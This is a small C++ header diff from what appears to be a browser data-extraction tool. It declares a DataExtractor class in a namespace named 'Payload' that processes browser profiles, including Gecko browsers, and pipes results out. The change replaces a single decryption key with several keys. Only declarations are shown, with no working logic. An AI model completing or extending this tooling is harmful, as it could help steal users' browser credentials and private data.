@@ -15,7 +15,7 @@ namespace Payload {
     private:
         void ExtractWebRTC(const std::filesystem::path& prefsPath, const std::filesystem::path& outFile);
     public:
-        DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase, bool isGecko = false);
+        DataExtractor(PipeClient& pipe, const std::vector<std::vector<uint8_t>>& keys, const std::filesystem::path& outputBase, bool isGecko = false);
 
         void ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName);
         void ProcessUnencrypted(const std::filesystem::path& profilePath, const std::string& browserName);
@@ -46,7 +46,7 @@ namespace Payload {
 
         bool m_isGecko;
         PipeClient& m_pipe;
-        std::vector<uint8_t> m_key;
+        std::vector<std::vector<uint8_t>> m_keys;
         std::filesystem::path m_outputBase;
 
         std::vector<std::filesystem::path> m_tempFiles;
